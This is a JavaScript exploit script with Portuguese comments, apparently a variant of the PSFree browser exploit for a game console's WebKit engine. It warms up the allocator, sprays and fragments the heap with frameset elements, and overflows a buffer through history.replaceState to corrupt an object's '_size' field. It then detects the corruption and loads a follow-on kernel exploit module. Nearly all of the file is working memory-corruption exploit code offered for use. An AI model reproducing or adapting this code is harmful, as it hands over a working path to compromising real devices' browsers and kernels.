/* PSFree Modular: Frameset OOM Detector
   Target: 1MB Contiguous Object (_size + _data)
   Success Condition: Memory Error when reading property
*/

import { log, sleep } from './module/utils.mjs';

// --- CONFIGURAÇÃO ---
const BASE_OFFSET = 709520; 
const OVERFLOW_AMT = 1024 * 64; 

// Configuração da Vítima (1MB)
// Total 1MB - 8 bytes header = Dados
const TARGET_BYTES = 1024 * 1024;
const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);

var victims = [];

async function main() {
    log("=== PSFree: Frameset OOM Detector ===");
    log("Estratégia: Corromper '_size' e detectar Erro de Memória.");

    // 1. WARMUP (Do arquivo psfree.mjs original)
    // Prepara o alocador para receber objetos grandes no lugar certo
    log("[1] Aquecendo alocador...");
    let dummy = "W".repeat(BASE_OFFSET);
    history.replaceState(dummy, "warmup", null);
    await sleep(100);

    // Tenta pontes de 0 a 24 bytes (ajuste fino de alinhamento)
    for (let bridge = 0; bridge <= 24; bridge += 8) {
        log(`\n[TESTE] Ponte de Zeros: ${bridge} bytes`);
        
        await prepare_heap();
        
        // Dispara
        let success = await trigger_exploit(bridge);
        
        if (success) {
            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
            log("O sistema tentou alocar memória infinita. Temos controle.", 'green');
            
            log("Carregando Kernel Exploit (Lapse)...", 'green');
            // Carrega a cadeia que usa o seu arquivo 1200.mjs
            await import('./lapse.mjs');
            return;
        }
        
        // Limpa para a próxima tentativa
        victims = [];
        await forceGC();
    }
    
    log("Falha. Reinicie o console para limpar o Heap.", 'red');
}

async function prepare_heap() {
    victims = [];
    const SPRAY_COUNT = 80;

    // SPRAY FRAMESET
    for(let i=0; i<SPRAY_COUNT; i++) {
        let fset = document.createElement('frameset');
        fset.rows = ROWS_STRING;
        victims.push(fset);
    }

    // BURACOS (Feng Shui)
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i].rows = ""; 
        victims[i] = null;
    }
    await forceGC();
}

async function trigger_exploit(bridgeSize) {
    try {
        let buffer = "A".repeat(BASE_OFFSET);
        
        // A Ponte: Zeros para alinhar ou pular padding sem causar crash
        if (bridgeSize > 0) {
            buffer += "\u0000".repeat(bridgeSize);
        }
        
        // O Ataque: 0x01 no _size
        // Isso transforma o tamanho em um número gigante
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "pwn", "/" + buffer);

        return check_victims();

    } catch(e) {
        log("Erro no Trigger (Ignorado): " + e.message);
        return false;
    }
}

function check_victims() {
    for(let i=1; i<victims.length; i+=2) {
        let fset = victims[i];
        if(!fset) continue;

        try {
            // Tenta ler a propriedade.
            // Se _size for normal, lê rápido.
            // Se _size for 0x0101... (Gigante), vai tentar alocar string de Petabytes.
            let s = fset.rows;
            
            // Se leu e o tamanho está visivelmente errado
            if (s.length !== ROWS_STRING.length) {
                log(`[JACKPOT] Tamanho alterado detectado: ${s.length}`, 'green');
                return true;
            }

        } catch(e) {
            // AQUI É A VITÓRIA REAL
            // O Catch pega o erro "Out of Memory" ou "Invalid String Length"
            log(`[JACKPOT] Erro ao ler Frameset ${i}: ${e.message}`, 'green');
            return true;
        }
    }
    return false;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

main();
